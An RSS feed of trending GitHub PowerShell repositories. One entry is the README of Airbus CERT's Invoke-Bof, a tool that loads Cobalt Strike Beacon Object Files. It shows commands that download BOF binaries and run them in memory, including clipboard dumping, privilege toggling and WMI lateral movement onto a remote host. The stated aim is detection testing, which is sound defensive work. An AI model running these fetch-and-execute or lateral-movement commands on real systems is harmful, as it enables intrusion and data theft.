<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub PowerShell Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2022-06-28T01:50:29Z</updated>
  <subtitle>Daily Trending of PowerShell in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>Azure/azure-docs-json-samples</title>
    <updated>2022-06-28T01:50:29Z</updated>
    <id>tag:github.com,2022-06-28:/Azure/azure-docs-json-samples</id>
    <link href="https://github.com/Azure/azure-docs-json-samples" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Contains examples of JSON files that are included in Azure documentation.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;JSON samples in Azure documentation&lt;/h1&gt; &#xA;&lt;p&gt;This repository contains JavaScript Object Notation (JSON) samples that are used in Azure Resource Manager (ARM) documentation. There are samples that show the syntax, such as an &lt;code&gt;array&lt;/code&gt; function or deploy a single resource such as storage account. There are also samples that deploy multiple resources needed to complete a tutorial.&lt;/p&gt; &#xA;&lt;h2&gt;Directory structure&lt;/h2&gt; &#xA;&lt;p&gt;The following table describes the repository&#39;s contents with links to the directories. The directories have &lt;em&gt;readme.md&lt;/em&gt; files with links to articles that use the samples. When practical, direct links are used to a sample&#39;s first occurence in an article.&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Directory&lt;/th&gt; &#xA;   &lt;th&gt;Purpose&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure/azure-docs-json-samples/master/application-insights&#34;&gt;application-insights&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Azure Application Insights Profiler for Service Fabric, virtual machines, or virtual machine scale sets.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure/azure-docs-json-samples/master/azure-resource-manager&#34;&gt;azure-resource-manager&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;ARM syntax examples: functions, linked and nested templates, multiple instances, scope, template specs, and what-if.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure/azure-docs-json-samples/master/container-instances&#34;&gt;container-instances&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Container Instances that mount a volume with an empty directory, Git repository, or a secret.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure/azure-docs-json-samples/master/custom-providers&#34;&gt;custom-providers&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Deploy a custom resource provider in Azure.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure/azure-docs-json-samples/master/deployment-script&#34;&gt;deployment-script&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Use Azure CLI or PowerShell to run scripts in templates.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure/azure-docs-json-samples/master/event-grid&#34;&gt;event-grid&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Deploy Azure resources to migrate Event Hubs data to Synapse Analytics.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure/azure-docs-json-samples/master/get-started-deployment&#34;&gt;get-started-deployment&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Templates deployed from local computer, linked templates, or use Azure Pipelines.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure/azure-docs-json-samples/master/get-started-with-templates&#34;&gt;get-started-with-templates&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Templates used in the ARM tutorial series &lt;em&gt;Beginner JSON templates&lt;/em&gt;.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure/azure-docs-json-samples/master/linked-template-relpath&#34;&gt;linked-template-relpath&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Use a relative path for linked templates.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure/azure-docs-json-samples/master/managed-app-existing-vnet&#34;&gt;managed-app-existing-vnet&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Template and UI definition that defines a managed application to integrate with a virtual network.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure/azure-docs-json-samples/master/management-level-deployment&#34;&gt;management-level-deployment&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Deploy resources at the management group level. For example, policies or role assignments.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure/azure-docs-json-samples/master/tutorial-sql-extension&#34;&gt;tutorial-sql-extension&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Use SQL extensions to import a SQL BACPAC file into a SQL database.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure/azure-docs-json-samples/master/tutorial-vm-extension&#34;&gt;tutorial-vm-extension&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;PowerShell script that&#39;s linked in an article.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure/azure-docs-json-samples/master/tutorials-use-key-vault&#34;&gt;tutorials-use-key-vault&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Template to deploy a key vault that&#39;s linked in a tutorial.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h2&gt;Contributing&lt;/h2&gt; &#xA;&lt;p&gt;This project welcomes contributions and suggestions. Most contributions require you to agree to a Contributor License Agreement (CLA) declaring that you have the right to, and actually do, grant us the rights to use your contribution. For details, visit &lt;a href=&#34;https://cla.microsoft.com&#34;&gt;https://cla.microsoft.com&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;When you submit a pull request, a CLA-bot will automatically determine whether you need to provide a CLA and decorate the PR appropriately (e.g., label, comment). Simply follow the instructions provided by the bot. You will only need to do this once across all repos using our CLA.&lt;/p&gt; &#xA;&lt;p&gt;This project has adopted the &lt;a href=&#34;https://opensource.microsoft.com/codeofconduct/&#34;&gt;Microsoft Open Source Code of Conduct&lt;/a&gt;. For more information see the &lt;a href=&#34;https://opensource.microsoft.com/codeofconduct/faq/&#34;&gt;Code of Conduct FAQ&lt;/a&gt; or contact &lt;a href=&#34;mailto:opencode@microsoft.com&#34;&gt;opencode@microsoft.com&lt;/a&gt; with any additional questions or comments.&lt;/p&gt; &#xA;&lt;h2&gt;Legal Notices&lt;/h2&gt; &#xA;&lt;p&gt;Microsoft and any contributors grant you a license to the Microsoft documentation and other content in this repository under the &lt;a href=&#34;https://creativecommons.org/licenses/by/4.0/legalcode&#34;&gt;Creative Commons Attribution 4.0 International Public License&lt;/a&gt;, see the &lt;a href=&#34;https://raw.githubusercontent.com/Azure/azure-docs-json-samples/master/LICENSE&#34;&gt;LICENSE&lt;/a&gt; file, and grant you a license to any code in the repository under the &lt;a href=&#34;https://opensource.org/licenses/MIT&#34;&gt;MIT License&lt;/a&gt;, see the &lt;a href=&#34;https://raw.githubusercontent.com/Azure/azure-docs-json-samples/master/LICENSE-CODE&#34;&gt;LICENSE-CODE&lt;/a&gt; file.&lt;/p&gt; &#xA;&lt;p&gt;Microsoft, Windows, Microsoft Azure and/or other Microsoft products and services referenced in the documentation may be either trademarks or registered trademarks of Microsoft in the United States and/or other countries. The licenses for this project do not grant you rights to use any Microsoft names, logos, or trademarks. Microsoft&#39;s general trademark guidelines can be found at &lt;a href=&#34;http://go.microsoft.com/fwlink/?LinkID=254653&#34;&gt;http://go.microsoft.com/fwlink/?LinkID=254653&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Privacy information can be found at &lt;a href=&#34;https://privacy.microsoft.com/en-us/&#34;&gt;https://privacy.microsoft.com/en-us/&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Microsoft and any contributors reserve all others rights, whether under their respective copyrights, patents, or trademarks, whether by implication, estoppel or otherwise.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>FeruzRus/sharkrdp</title>
    <updated>2022-06-28T01:50:29Z</updated>
    <id>tag:github.com,2022-06-28:/FeruzRus/sharkrdp</id>
    <link href="https://github.com/FeruzRus/sharkrdp" rel="alternate"></link>
    <summary type="html">&lt;p&gt;&lt;/p&gt;&lt;hr&gt;</summary>
  </entry>
  <entry>
    <title>airbus-cert/Invoke-Bof</title>
    <updated>2022-06-28T01:50:29Z</updated>
    <id>tag:github.com,2022-06-28:/airbus-cert/Invoke-Bof</id>
    <link href="https://github.com/airbus-cert/Invoke-Bof" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Load any Beacon Object File using Powershell!&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Invoke-Bof&lt;/h1&gt; &#xA;&lt;p&gt;Load any Beacon Object File using Powershell!&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;&amp;gt; $BOFBytes = (Invoke-WebRequest -Uri &#34;https://github.com/airbus-cert/Invoke-Bof/raw/main/test/test_invoke_bof.x64.o&#34;).Content&#xA;&amp;gt; Invoke-Bof -BOFBytes $BOFBytes -EntryPoint go -ArgumentList &#34;toto&#34;,14&#xA;&#xA;██╗███╗   ██╗██╗   ██╗ ██████╗ ██╗  ██╗███████╗    ██████╗  ██████╗ ███████╗&#xA;██║████╗  ██║██║   ██║██╔═══██╗██║ ██╔╝██╔════╝    ██╔══██╗██╔═══██╗██╔════╝&#xA;██║██╔██╗ ██║██║   ██║██║   ██║█████╔╝ █████╗█████╗██████╔╝██║   ██║█████╗  &#xA;██║██║╚██╗██║╚██╗ ██╔╝██║   ██║██╔═██╗ ██╔══╝╚════╝██╔══██╗██║   ██║██╔══╝  &#xA;██║██║ ╚████║ ╚████╔╝ ╚██████╔╝██║  ██╗███████╗    ██████╔╝╚██████╔╝██║     &#xA;╚═╝╚═╝  ╚═══╝  ╚═══╝   ╚═════╝ ╚═╝  ╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚═╝     &#xA;                                               &#xA;  [v0.1 Made with love by Airbus CERT https://github.com/airbus-cert]&#xA;&#xA;[+] Mapping of .text    at  0x19924310000&#xA;[+] Mapping of .rdata   at  0x19924320000&#xA;[+] Mapping of .xdata   at  0x19924330000&#xA;[+] Mapping of .pdata   at  0x19924540000&#xA;[+] Mapping of /4       at  0x19924550000&#xA;[+] Jump into beacon at 0x19924310000&#xA;****************************************************************************&#xA;Test Beacon for Invoke-Bof&#xA;Argument 1 : toto&#xA;Argument 2 : 14&#xA;&#xA;=============================== Beacon Output ==============================&#xA;00000000   66 6F 6F 00 6F 00 00 00 62 61 72 20 32 32 32 33  foo.o...bar 2223&#xA;00000010   33 33                                            33              &#xA;============================================================================&#xA;[+] Clipboard updated !&#xA;[!] Active Windows : Windows PowerShell ISE&#xA;[!] Content : $BOFBytes = [IO.File]::ReadAllBytes($Path)&#xA;****************************************************************************&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;CobaltStrike appears to be the favoured offensive framework, used by a large majority of the offensive side of cybersecurity.&lt;/p&gt; &#xA;&lt;p&gt;The framework is very extensible and allows Red Teamers to develop specific offensive modules named BOF, short for Beacon Object File. Beacons are what CobaltStrike calls their agents, or final payloads.&lt;/p&gt; &#xA;&lt;p&gt;A Beacon Object File is split into two parts:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;A payload that will be executed on the victim machine&lt;/li&gt; &#xA; &lt;li&gt;An aggressor script, which will prepare and interact with the payload&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Many Red Teams publish BOFs on their public GitHub repositories, implementing lateral movement, vulnerability, attack, or persistence. Instead of reimplementing these techniques each time we want to try and detect them, We decided to find a way to execute them directly.&lt;/p&gt; &#xA;&lt;h1&gt;Get-Help Invoke-Bof&lt;/h1&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Parameter&lt;/th&gt; &#xA;   &lt;th&gt;help&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;BOFBytes&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;A byte array containing the beacon object file to load and execute. Loading a BOF from a local file : &lt;br&gt;&lt;code&gt;$BOFBytes = [IO.File]::ReadAllBytes(&#34;c:\my_bof.o&#34;)&lt;/code&gt;&lt;br&gt;A BOF hosted on a repository : &lt;br&gt;&lt;code&gt;$BOFBytes = (Invoke-WebRequest -Uri &#34;https://github.com/airbus-cert/Invoke-Bof/raw/main/test/test_invoke_bof.x64.o&#34;).Content&lt;/code&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;EntryPoint&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Name of the function to call (the convention is to name the entry point &lt;strong&gt;go&lt;/strong&gt;)&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;ArgumentList&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;List of all arguments that will be passed to the main function. For example marshall two arguments, the first as string, the second as integer : &lt;br&gt;&lt;code&gt;Invoke-Bof -BOFBytes $BOFBytes -EntryPoint go -ArgumentList &#34;toto&#34;,14&lt;/code&gt; &lt;br&gt;To know the parameters accepted by a BOF, please take a look at the aggressor script.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;UnicodeStringParameter&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Marshal all string parameters as UTF-16LE strings&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;p&gt;Example :&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$BOFBytes = (Invoke-WebRequest -Uri &#34;https://github.com/airbus-cert/Invoke-Bof/raw/main/test/test_invoke_bof.x64.o&#34;).Content&#xA;Invoke-Bof -BOFBytes $BOFBytes -EntryPoint go -ArgumentList &#34;toto&#34;,14&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h1&gt;How does it works?&lt;/h1&gt; &#xA;&lt;p&gt;✈️ If you want to know what is behind the scene, please read the dedicated &lt;a href=&#34;https://skyblue.team/posts/invoke-bof/&#34;&gt;blog post&lt;/a&gt; !!! ✈️&lt;/p&gt; &#xA;&lt;h1&gt;Launch Every Beacon Carefully!&lt;/h1&gt; &#xA;&lt;p&gt;Now we can launch every beacon available from Github. For example, we can test a beacon that dumps our clipboard:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;&amp;gt; $BOFBytes = (Invoke-WebRequest -Uri &#34;https://github.com/DallasFR/BOF_dumpclip/raw/main/dump.o&#34;).Content&#xA;&amp;gt; Invoke-Bof -BOFBytes $BOFBytes -EntryPoint go&#xA;&#xA;&#xA;&#xA;██╗███╗   ██╗██╗   ██╗ ██████╗ ██╗  ██╗███████╗    ██████╗  ██████╗ ███████╗&#xA;██║████╗  ██║██║   ██║██╔═══██╗██║ ██╔╝██╔════╝    ██╔══██╗██╔═══██╗██╔════╝&#xA;██║██╔██╗ ██║██║   ██║██║   ██║█████╔╝ █████╗█████╗██████╔╝██║   ██║█████╗  &#xA;██║██║╚██╗██║╚██╗ ██╔╝██║   ██║██╔═██╗ ██╔══╝╚════╝██╔══██╗██║   ██║██╔══╝  &#xA;██║██║ ╚████║ ╚████╔╝ ╚██████╔╝██║  ██╗███████╗    ██████╔╝╚██████╔╝██║     &#xA;╚═╝╚═╝  ╚═══╝  ╚═══╝   ╚═════╝ ╚═╝  ╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚═╝     &#xA;                                               &#xA;  [v0.1 Made with love by Airbus CERT https://github.com/airbus-cert]&#xA;&#xA;&#xA;&#xA;[+] Mapping of .text    at  0x133e0c20000&#xA;[+] Mapping of .rdata   at  0x133e0c30000&#xA;[+] Mapping of .xdata   at  0x133e0c40000&#xA;[+] Mapping of .pdata   at  0x133e0c50000&#xA;[+] Mapping of /4       at  0x133e0c60000&#xA;[+] Jump into beacon at 0x133e0c20000&#xA;****************************************************************************&#xA;[+] Clipboard updated !&#xA;[!]Active Windows : Windows PowerShell ISE&#xA;[!] Content : $BOFBytes = (Invoke-WebRequest -Uri &#34;https://github.com/DallasFR/BOF_dumpclip/raw/main/dump.o&#34;).Content&#xA;Invoke-Bof -BOFBytes $BOFBytes  -EntryPoint go&#xA;----------------------------------&#xA;&#xA;****************************************************************************&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;We can try to detect an attacker that tries to enable &lt;em&gt;SE_DEBUG&lt;/em&gt; privilege:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;&amp;gt; $BOFBytes = (Invoke-WebRequest -Uri &#34;https://github.com/EspressoCake/Toggle_Token_Privileges_BOF/raw/main/dist/toggle_privileges_bof.x64.o&#34;).Content&#xA;&amp;gt; Invoke-Bof -BOFBytes $BOFBytes -EntryPoint enable -ArgumentList 20&#xA;&#xA;&#xA;&#xA;██╗███╗   ██╗██╗   ██╗ ██████╗ ██╗  ██╗███████╗    ██████╗  ██████╗ ███████╗&#xA;██║████╗  ██║██║   ██║██╔═══██╗██║ ██╔╝██╔════╝    ██╔══██╗██╔═══██╗██╔════╝&#xA;██║██╔██╗ ██║██║   ██║██║   ██║█████╔╝ █████╗█████╗██████╔╝██║   ██║█████╗  &#xA;██║██║╚██╗██║╚██╗ ██╔╝██║   ██║██╔═██╗ ██╔══╝╚════╝██╔══██╗██║   ██║██╔══╝  &#xA;██║██║ ╚████║ ╚████╔╝ ╚██████╔╝██║  ██╗███████╗    ██████╔╝╚██████╔╝██║     &#xA;╚═╝╚═╝  ╚═══╝  ╚═══╝   ╚═════╝ ╚═╝  ╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚═╝     &#xA;                                               &#xA;  [v0.1 Made with love by Airbus CERT https://github.com/airbus-cert]&#xA;&#xA;&#xA;&#xA;[+] Mapping of .text    at  0x133e0ab0000&#xA;[+] Mapping of .data    at  0x133e0bf0000&#xA;[+] Mapping of .xdata   at  0x133e0c20000&#xA;[+] Mapping of .pdata   at  0x133e0c30000&#xA;[+] Mapping of .rdata   at  0x133e0c40000&#xA;[+] Mapping of /4       at  0x133e0c50000&#xA;[+] Jump into beacon at 0x133e0ab0c10&#xA;****************************************************************************&#xA;Authors:&#xA;&#x9;@the_bit_diddler&#xA;&#x9;@hackersoup&#xA;&#xA;You are not currently in an administrative session. Come again later!&#xA;&#xA;****************************************************************************&#xA;&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You want to execute a process using WMI create process:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;&amp;gt; $BOFBytes = (Invoke-WebRequest -Uri &#34;https://github.com/Yaxser/CobaltStrike-BOF/raw/master/WMI%20Lateral%20Movement/ProcCreate.x64.o&#34;).Content&#xA;&amp;gt; Invoke-Bof -BOFBytes $BOFBytes -EntryPoint go -ArgumentList &#34;\\COMPUTER\ROOT\CIMV2&#34;,&#34;domain&#34;,&#34;username&#34;,&#34;username&#34;,&#34;cmd.exe /C powershell.exe&#34;,1 -UnicodeStringParameter&#xA;&#xA;&#xA;██╗███╗   ██╗██╗   ██╗ ██████╗ ██╗  ██╗███████╗    ██████╗  ██████╗ ███████╗&#xA;██║████╗  ██║██║   ██║██╔═══██╗██║ ██╔╝██╔════╝    ██╔══██╗██╔═══██╗██╔════╝&#xA;██║██╔██╗ ██║██║   ██║██║   ██║█████╔╝ █████╗█████╗██████╔╝██║   ██║█████╗&#xA;██║██║╚██╗██║╚██╗ ██╔╝██║   ██║██╔═██╗ ██╔══╝╚════╝██╔══██╗██║   ██║██╔══╝&#xA;██║██║ ╚████║ ╚████╔╝ ╚██████╔╝██║  ██╗███████╗    ██████╔╝╚██████╔╝██║&#xA;╚═╝╚═╝  ╚═══╝  ╚═══╝   ╚═════╝ ╚═╝  ╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚═╝&#xA;&#xA;  [v0.1 Made with love by Airbus CERT https://github.com/airbus-cert]&#xA;&#xA;&#xA;&#xA;[+] Mapping of .text at  0x2e940940000&#xA;[+] Mapping of /4 at  0x2e95a880000&#xA;[+] Mapping of /30 at  0x2e95a890000&#xA;[+] Mapping of /57 at  0x2e95a8f0000&#xA;[+] Mapping of /84 at  0x2e95a900000&#xA;[+] Mapping of /110 at  0x2e95b160000&#xA;[+] Mapping of /137 at  0x2e95b170000&#xA;[+] Mapping of /164 at  0x2e95b180000&#xA;[+] Mapping of /193 at  0x2e95b190000&#xA;[+] Mapping of /223 at  0x2e95b1a0000&#xA;[+] Mapping of .xdata at  0x2e95b1b0000&#xA;[+] Mapping of .pdata at  0x2e95b1c0000&#xA;[+] Mapping of .rdata at  0x2e95b1d0000&#xA;[+] Mapping of /253 at  0x2e95b1e0000&#xA;[+] Mapping of /277 at  0x2e95b1f0000&#xA;[+] Mapping of /301 at  0x2e95b200000&#xA;[+] Mapping of /325 at  0x2e95b230000&#xA;[!] Unable to parse API name :  _ZTV10_com_error  /!\ continue without resolving /!\&#xA;[!] Unable to parse API name :  _ZN10_com_error4DtorEv  /!\ continue without resolving /!\&#xA;[!] Unable to parse API name :  _ZN10_com_errorD1Ev  /!\ continue without resolving /!\&#xA;[!] Unable to parse API name :  __imp_LocalFree  /!\ continue without resolving /!\&#xA;[!] Unable to parse API name :  _Unwind_Resume  /!\ continue without resolving /!\&#xA;[!] Unable to parse API name :  __cxa_call_unexpected  /!\ continue without resolving /!\&#xA;[!] Unable to parse API name :  __gxx_personality_seh0  /!\ continue without resolving /!\&#xA;[!] Unable to parse API name :  _ZTI10_com_error  /!\ continue without resolving /!\&#xA;[!] Unable to parse API name :  _ZN10_com_errorD1Ev  /!\ continue without resolving /!\&#xA;[!] Unable to parse API name :  _ZN10_com_errorD0Ev  /!\ continue without resolving /!\&#xA;[!] Unable to parse API name :  _ZTVN10__cxxabiv117__class_type_infoE  /!\ continue without resolving /!\&#xA;[!] Unable to parse API name :  _ZTS10_com_error  /!\ continue without resolving /!\&#xA;[+] Jump into beacon at 0x2e940940181&#xA;****************************************************************************&#xA;ExecMethod Succeeded!&#xA;****************************************************************************&#xA;&lt;/code&gt;&lt;/pre&gt;</summary>
  </entry>
</feed>